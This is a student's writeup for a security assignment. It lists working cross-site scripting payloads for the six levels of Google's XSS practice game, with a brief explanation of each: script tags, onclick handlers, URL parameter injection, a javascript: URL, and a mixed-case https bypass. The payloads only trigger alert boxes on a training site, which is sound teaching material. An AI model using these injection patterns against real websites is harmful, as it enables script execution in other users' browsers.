Writeup 14
=====

Name: Ethan Farkas
Section: 0201
I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Ethan Farkas

## Assignment 10 Writeup

### Part 1 (70 Pts)


### Part 2 (30 Pts)
1.	beaten with <script> alert("Hello\nHow are you?"); </script>  Simply embedding a script produced the alert
2.	 beaten with  <button onclick=alert(‘asdf’);>Try it</button>  This time, I used a button with an onclick to make the alert.
3.	beaten with https://xss-game.appspot.com/level3/frame#2'onclick=alert('asdf');>  Here I was able to modify the attribute of the image to have an onclick to make an alert.
4.	https://xss-game.appspot.com/level4/frame?timer=')%3Balert(‘asdf’)%3Bvar qwer=('
I needed some help to get this one, but the key was using %3b which translates to ';', essentially allowing me to inject commands.
5.	https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('asdf');
Here the code uses a variable called next, which is passed into the url.  Passing in javascript as the value of next allows me to popup an alert.
6.	https://xss-game.appspot.com/level6/frame#hTtps://google.com/jsapi?callback=alert
I followed the advice in the hint, and used google's jsapi to host the alert.  The problem with the code was that it didn't check for all versions of https, so capital letters are not detected
